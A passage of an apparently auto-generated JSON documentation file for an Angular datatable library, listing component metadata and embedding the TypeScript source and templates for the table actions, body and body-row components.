      "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": ""
    },
    {
      "name": "StoDatatableBodyComponent",
      "id": "component-StoDatatableBodyComponent-faf1253b80c4b32c710e21cb649b82fe10a0ce57325eb397d0aed2dcb6f3369718d9b97f6cd88875cdb05fa0c4665bf9ccc06436b74ec3a446db8d530da3cb45",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-body",
      "styleUrls": [
        "./sto-datatable-body.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable-body.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "columnMode",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 73,
          "type": "ColumnDisplay",
          "decorators": []
        },
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 69,
          "type": "Column[]",
          "decorators": []
        },
        {
          "name": "disableRipple",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 51,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "hasFooter",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 83,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "height",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 57,
          "type": "number | null",
          "decorators": []
        },
        {
          "name": "responsive",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 49,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "responsiveView",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 55,
          "type": "TemplateRef<>",
          "decorators": []
        },
        {
          "name": "rowClass",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 77,
          "type": "rowClassFn",
          "decorators": []
        },
        {
          "name": "rowHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 65,
          "type": "number",
          "decorators": []
        },
        {
          "name": "rows",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 59,
          "type": "Array<T>",
          "decorators": []
        },
        {
          "name": "scrollbarH",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 28,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "scrollLeft",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 81,
          "type": "string | null",
          "decorators": []
        },
        {
          "name": "selectable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 61,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "selected",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 67,
          "type": "T",
          "decorators": []
        },
        {
          "name": "selectionMode",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 79,
          "type": "SelectionModes",
          "decorators": []
        },
        {
          "name": "smallView",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 53,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "trackBy",
          "defaultValue": "(index: number, item: T) => {\n    return index;\n  }",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 120,
          "type": "(index: number, item: T) => number",
          "decorators": []
        },
        {
          "name": "virtualScroll",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 71,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "width",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 63,
          "type": "string",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "activate",
          "defaultValue": "new EventEmitter<RowActivation<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 89,
          "type": "EventEmitter"
        },
        {
          "name": "rowContextMenu",
          "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 87,
          "type": "EventEmitter"
        },
        {
          "name": "rowSelected",
          "defaultValue": "new EventEmitter<RowSelection<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 85,
          "type": "EventEmitter"
        },
        {
          "name": "scrollHeader",
          "defaultValue": "new EventEmitter<Event>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 91,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_rowClass",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 123
        },
        {
          "name": "_scrollbarH",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 75,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 97,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "horizontalScrollActive",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 100,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "resizeObserver",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ResizeObserver",
          "optional": false,
          "description": "",
          "line": 99,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "scrollElement",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLElement>",
          "optional": false,
          "description": "",
          "line": 47,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'scrollViewport', {read: ElementRef}"
            }
          ]
        },
        {
          "name": "scroller",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLDivElement>",
          "optional": false,
          "description": "",
          "line": 95,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'scroller'"
            }
          ]
        },
        {
          "name": "timeout",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | undefined",
          "optional": false,
          "description": "",
          "line": 98,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "verticalScrollOffset",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 101,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "vScroller",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "CdkVirtualScrollViewport",
          "optional": false,
          "description": "",
          "line": 93,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "CdkVirtualScrollViewport"
            }
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "horzScrollPosition",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 147,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 139,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 131,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onKeyDownHandler",
          "args": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "rowEl",
              "type": "HTMLDivElement",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "activationData",
              "type": "RowSelection<T> | RowActivation<T>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 243,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "rowEl",
              "type": "HTMLDivElement",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "activationData",
              "type": "RowSelection<T> | RowActivation<T>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onresize",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 104,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'window:resize', ['$event']"
            }
          ]
        },
        {
          "name": "selectRow",
          "args": [
            {
              "name": "event",
              "type": "KeyboardEvent | MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "activationData",
              "type": "RowSelection<T>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 230,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "KeyboardEvent | MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "activationData",
              "type": "RowSelection<T>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "virtHorzScrollPosition",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 190,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "window:resize",
          "args": [],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 104
        }
      ],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostListener,\n  Input,\n  OnDestroy,\n  Output,\n  TemplateRef,\n  ViewChild\n} from '@angular/core';\nimport { Subject } from 'rxjs';\nimport { RowActivation, RowContextMenu, RowSelection } from '../events';\nimport { Column, ColumnDisplay } from '../columns';\nimport { CdkVirtualScrollViewport } from '@angular/cdk/scrolling';\nimport { SelectionModes } from '../selection-modes';\nimport { rowClassFn } from '../models';\n\n@Component({\n  selector: 'sto-datatable-body',\n  templateUrl: './sto-datatable-body.component.html',\n  styleUrls: [ './sto-datatable-body.component.scss' ]\n})\nexport class StoDatatableBodyComponent<T extends Record<string, unknown>> implements OnDestroy, AfterViewInit {\n\n  @Input()\n  get scrollbarH(): boolean {\n    return this._scrollbarH;\n  }\n\n  set scrollbarH(scrollbarH: boolean) {\n    this._scrollbarH = scrollbarH;\n    this.horizontalScrollActive = false;\n    if ( this.resizeObserver ) {\n      this.resizeObserver.disconnect();\n    }\n    if ( scrollbarH && this.virtualScroll && this.vScroller ) {\n      this.virtHorzScrollPosition();\n    } else if ( scrollbarH ) {\n      this.horzScrollPosition();\n    }\n    requestAnimationFrame(() => window.dispatchEvent(new Event('resize')));\n  }\n\n  @ViewChild('scrollViewport', { read: ElementRef })\n  scrollElement: ElementRef<HTMLElement>;\n  @Input()\n  responsive: boolean;\n  @Input()\n  disableRipple: boolean;\n  @Input()\n  smallView: boolean;\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  height: number | null;\n  @Input()\n  rows: Array<T>;\n  @Input()\n  selectable: boolean;\n  @Input()\n  width: string;\n  @Input()\n  rowHeight: number;\n  @Input()\n  selected: T;\n  @Input()\n  columns: Column[];\n  @Input()\n  virtualScroll: boolean;\n  @Input()\n  columnMode: ColumnDisplay;\n\n  private _scrollbarH: boolean;\n  @Input()\n  rowClass: rowClassFn;\n  @Input()\n  selectionMode: SelectionModes;\n  @Input()\n  scrollLeft: string | null;\n  @Input()\n  hasFooter: boolean;\n  @Output()\n  rowSelected = new EventEmitter<RowSelection<T>>();\n  @Output()\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\n  @Output()\n  activate = new EventEmitter<RowActivation<T>>();\n  @Output()\n  scrollHeader = new EventEmitter<Event>();\n  @ViewChild(CdkVirtualScrollViewport)\n  vScroller: CdkVirtualScrollViewport;\n  @ViewChild('scroller')\n  scroller: ElementRef<HTMLDivElement>;\n\n  private destroyed$ = new Subject<boolean>();\n  private timeout: number | undefined;\n  private resizeObserver: ResizeObserver;\n  public horizontalScrollActive: boolean;\n  public verticalScrollOffset = 0;\n\n  @HostListener('window:resize', [ '$event' ])\n  onresize() {\n    if ( !this.vScroller ) {\n      return;\n    }\n    if ( this.timeout ) {\n      clearTimeout(this.timeout);\n    }\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    this.timeout = setTimeout(() => {\n      this.vScroller.ngOnInit();\n    }, 100);\n  }\n\n  @Input()\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  trackBy = (index: number, item: T) => {\n    return index;\n  };\n  _rowClass = (row: T) => {\n    let userDefinedClass = '';\n    if ( this.rowClass ) {\n      userDefinedClass = this.rowClass.bind(this)(row);\n    }\n    return `${userDefinedClass} sto-mdl-table__body__row`;\n  };\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n    if ( this.resizeObserver ) {\n      this.resizeObserver.disconnect();\n    }\n  }\n\n  ngAfterViewInit() {\n    if ( this.scrollbarH && this.virtualScroll ) {\n      this.virtHorzScrollPosition();\n    } else if ( this.scrollbarH ) {\n      this.horzScrollPosition();\n    }\n  }\n\n  private horzScrollPosition() {\n    if ( !this.scroller ) {\n      return;\n    }\n    const elRef = this.scroller.nativeElement;\n    const cb: ResizeObserverCallback = (entries) => {\n      if ( !this.hasFooter ) {\n        return;\n      }\n      for ( const entry of entries ) {\n        const t = entry.target as HTMLElement;\n        const el = t;\n        const currentScale = el.style.transform;\n        const notScaled = this.rows.length * this.rowHeight;\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\n        if ( t.scrollWidth > t.offsetWidth ) {\n          this.horizontalScrollActive = true;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale === notScaled ) {\n            const newScaleValue = notScaled + this.rowHeight;\n            el.style.transform = `scaleY(${newScaleValue}`;\n          }\n        } else {\n          this.horizontalScrollActive = false;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale !== notScaled ) {\n            el.style.transform = `scaleY(${notScaled}`;\n          }\n        }\n      }\n    };\n    this.resizeObserver = new ResizeObserver(cb);\n    this.resizeObserver.observe(elRef);\n  }\n\n  private virtHorzScrollPosition() {\n    const elRef = this.vScroller.elementRef.nativeElement;\n    const cb: ResizeObserverCallback = (entries) => {\n      if ( !this.hasFooter ) {\n        return;\n      }\n      for ( const entry of entries ) {\n        const t = entry.target as HTMLElement;\n        const el = t.querySelector('.cdk-virtual-scroll-spacer') as HTMLDivElement;\n        const currentScale = el.style.transform;\n        const notScaled = this.rows.length * this.rowHeight;\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\n        if ( t.scrollWidth > t.offsetWidth ) {\n          this.horizontalScrollActive = true;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale === notScaled ) {\n            const newScaleValue = notScaled + this.rowHeight;\n            el.style.transform = `scaleY(${newScaleValue}`;\n          }\n        } else {\n          this.horizontalScrollActive = false;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale !== notScaled ) {\n            el.style.transform = `scaleY(${notScaled}`;\n          }\n        }\n      }\n    };\n    this.resizeObserver = new ResizeObserver(cb);\n    this.resizeObserver.observe(elRef);\n  }\n\n  selectRow(event: KeyboardEvent | MouseEvent, activationData: RowSelection<T>) {\n    if ( event.type === this.selectionMode ) {\n      this.rowSelected.emit(activationData);\n      const el = event.target as HTMLElement;\n      const ignoreRe = /.*mat-select.*|.*mat-option.*|.*mat-input.*|.*mat-form.*/i;\n      const elTag = el.tagName.toLowerCase();\n      const isIgnoredEl = ignoreRe.test(el.className) || elTag === 'input';\n      if ( !isIgnoredEl ) {\n        activationData.rowEl?.focus();\n      }\n    }\n  }\n\n  onKeyDownHandler(event: KeyboardEvent, rowEl: HTMLDivElement, activationData: RowSelection<T> | RowActivation<T>) {\n    this.activate.emit({ event, rowEl, row: activationData.row, index: activationData.index });\n    const next = rowEl.nextSibling as HTMLDivElement;\n    const prev = rowEl.previousSibling as HTMLDivElement;\n    switch ( event.key ) {\n      case 'ArrowDown':\n        if ( next && next instanceof HTMLElement ) {\n          next.focus();\n          event.preventDefault();\n        }\n        break;\n      case 'ArrowUp':\n        if ( prev && prev instanceof HTMLElement ) {\n          prev.focus();\n          event.preventDefault();\n        }\n        break;\n      case 'Enter':\n        this.rowSelected.emit(activationData);\n        break;\n    }\n  }\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "",
          "styleUrl": "./sto-datatable-body.component.scss"
        }
      ],
      "stylesData": "",
      "implements": [
        "OnDestroy",
        "AfterViewInit"
      ],
      "accessors": {
        "scrollbarH": {
          "name": "scrollbarH",
          "setSignature": {
            "name": "scrollbarH",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "scrollbarH",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 32,
            "jsdoctags": [
              {
                "name": "scrollbarH",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "scrollbarH",
            "type": "boolean",
            "returnType": "boolean",
            "line": 28
          }
        }
      },
      "templateData": "<cdk-virtual-scroll-viewport [itemSize]=\"(!smallView || !responsive) ? rowHeight : 80\"\n                             *ngIf=\"virtualScroll\"\n                             [style.height.px]=\"(height || 500) \"\n                             (scroll)=\"scrollHeader.emit($event)\"\n                             [class.sto-mdl-table__body--selectable]=\"selectable\"\n                             #scrollViewport\n                             [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\n                             class=\"sto-mdl-table__body\">\n  <sto-datatable-body-row *cdkVirtualFor=\"let row of rows; templateCacheSize: 0; let i = index; let last = last; trackBy: trackBy\"\n                          matRipple\n                          [matRippleDisabled]=\"disableRipple\"\n                          [matRippleUnbounded]=\"false\"\n                          [style.min-width]=\"width\"\n                          [style.transform]=\"scrollLeft\"\n                          [columnMode]=\"columnMode\"\n                          [tabindex]=\"0\"\n                          [columns]=\"columns\"\n                          [row]=\"row\"\n                          [responsiveView]=\"responsiveView\"\n                          [rowIndex]=\"i\"\n                          [rowClass]=\"rowClass\"\n                          #rowEl\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\n                          [isSelected]=\"selected === row\"\n                          [compressedView]=\"smallView && responsive\"\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          [style.overflow]=\"disableRipple ? 'visible' : 'hidden'\"\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n  </sto-datatable-body-row>\n  <sto-datatable-body-row [style.height.px]=\"rowHeight\"\n                          *ngIf=\"scrollbarH && hasFooter\"></sto-datatable-body-row>\n</cdk-virtual-scroll-viewport>\n\n<div class=\"sto-mdl-table__body sto-mdl-table__body--no-vscroll\"\n     *ngIf=\"!virtualScroll\"\n     (scroll)=\"scrollHeader.emit($event)\"\n     #scroller\n     [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\n     [class.sto-mdl-table__body--selectable]=\"selectable\"\n     [style.padding-bottom.px]=\"horizontalScrollActive && hasFooter ? rowHeight : 0\"\n     [style.height]=\"height ? (height + 'px') : 'auto'\">\n\n  <sto-datatable-body-row *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\n                          [style.min-width]=\"width\"\n                          [tabindex]=\"0\"\n                          [columns]=\"columns\"\n                          [row]=\"row\"\n                          [responsiveView]=\"responsiveView\"\n                          [rowIndex]=\"i\"\n                          [rowClass]=\"rowClass\"\n                          #rowEl\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\n                          [isSelected]=\"selected === row\"\n                          [compressedView]=\"smallView && responsive\"\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n  </sto-datatable-body-row>\n  <!--<div *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\n       [tabindex]=\"0\"\n       #rowEl\n       (keydown)=\"onKeyDownHandler($event, rowEl, {index: i, event: $event, row: row})\"\n       [ngClass]=\"_rowClass | exec:row\"\n       [class.sto-mdl-table__body__row&#45;&#45;selected]=\"selected === row\"\n       (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl})\"\n       [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n    <ng-container *ngIf=\"smallView && responsive; else regular\">\n      <ng-template [ngTemplateOutlet]=\"responsiveView\"\n                   [ngTemplateOutletContext]=\"{row: row}\">\n      </ng-template>\n    </ng-container>\n    <ng-template #regular>\n      <div class=\"sto-mdl-table__body__row__cell\"\n           [ngClass]=\"column.cellClass | exec:row[column.prop]:row:column\"\n           [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\n           [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\n           [style.flex-basis]=\"(column.flexBasis || 80) + 'px'\"\n           (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: i})\"\n           *ngFor=\"let column of columns;\">\n        <span *ngIf=\"!column.cellTemplate\"\n              [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\n        <ng-template #cellTemplate\n                     *ngIf=\"column.cellTemplate\"\n                     [ngTemplateOutlet]=\"column.cellTemplate\"\n                     [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: i}\">\n        </ng-template>\n      </div>\n    </ng-template>\n  </div>-->\n</div>\n"
    },
    {
      "name": "StoDatatableBodyRowComponent",
      "id": "component-StoDatatableBodyRowComponent-e4e19b28d31506a41fcefafbba29e70cd5b2fa9adefdca93327afe276c10937e90e26711ca618ed110f9a27b9becc8dc6829a40eb7bf6c10dd6d79207d4a49ae",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-body-row",
      "styleUrls": [
        "./sto-datatable-body-row.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable-body-row.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "columnMode",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 42,
          "type": "ColumnDisplay",
          "decorators": []
        },
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 30,
          "type": "Column[]",
          "decorators": []
        },
        {
          "name": "compressedView",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 32,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "isSelected",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 38,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "responsiveView",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 26,
          "type": "TemplateRef<>",
          "decorators": []
        },
        {
          "name": "row",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 28,
          "type": "T",
          "decorators": []
        },
        {
          "name": "rowClass",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 36,
          "type": "rowClassFn",
          "decorators": []
        },
        {
          "name": "rowIndex",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 34,
          "type": "number",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "rowContextMenu",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 40,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "element",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HTMLDivElement",
          "optional": false,
          "description": "",
          "line": 44,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "rowDiffer",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "KeyValueDiffer< | >",
          "optional": false,
          "description": "",
          "line": 73,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "trackColumn",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 74,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngDoCheck",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 83,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 48,
          "type": "string",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  DoCheck,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  KeyValueDiffer,\n  KeyValueDiffers,\n  Output,\n  TemplateRef\n} from '@angular/core';\nimport { Column, ColumnDisplay } from '../../columns';\nimport { rowClassFn } from '../../models';\n\n@Component({\n  selector: 'sto-datatable-body-row',\n  templateUrl: './sto-datatable-body-row.component.html',\n  styleUrls: ['./sto-datatable-body-row.component.scss'],\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoDatatableBodyRowComponent<T extends Record<string, unknown>> implements DoCheck {\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  row: T;\n  @Input()\n  columns: Column[];\n  @Input()\n  compressedView: boolean;\n  @Input()\n  rowIndex: number;\n  @Input()\n  rowClass: rowClassFn;\n  @Input()\n  isSelected: boolean;\n  @Output()\n  rowContextMenu = new EventEmitter();\n  @Input()\n  columnMode: ColumnDisplay;\n\n  public element: HTMLDivElement;\n\n\n  @HostBinding('class')\n  get cssClass() {\n    let cls = 'sto-mdl-table__body__row';\n    if ( this.isSelected ) {\n      cls += ' sto-mdl-table__body__row--selected';\n    }\n\n    if ( this.rowClass ) {\n      let userClass = ' ';\n      if ( typeof this.rowClass === 'function' ) {\n        userClass += this.rowClass(this.row);\n      } else if ( typeof this.rowClass === 'object' && !!this.rowClass ) {\n        userClass += Object.values(this.rowClass).join(' ');\n      } else if ( typeof this.rowClass === 'string' ) {\n        userClass += this.rowClass;\n      }\n      cls += userClass;\n    }\n\n    if ( this.compressedView ) {\n      cls += ' sto-mdl-table__body__row--compressed';\n    }\n\n    return cls;\n  }\n\n  private rowDiffer: KeyValueDiffer<unknown, unknown>;\n  public trackColumn = (index: number, column: Column) => {\n    return column.$$id ?? column.prop;\n  };\n\n  constructor(private differs: KeyValueDiffers, private cdr: ChangeDetectorRef, private elRef: ElementRef) {\n    this.rowDiffer = differs.find({}).create();\n    this.element = this.elRef.nativeElement as HTMLDivElement;\n  }\n\n  ngDoCheck() {\n    if ( this.rowDiffer.diff(this.row) ) {\n      this.cdr.detectChanges();\n    }\n  }\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-mdl-table__body__row__cell {\n  transition: flex 0.25s ease-in-out;\n}\n",
          "styleUrl": "./sto-datatable-body-row.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "differs",
            "type": "KeyValueDiffers",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "elRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 76,
        "jsdoctags": [
          {
            "name": "differs",
            "type": "KeyValueDiffers",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "elRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
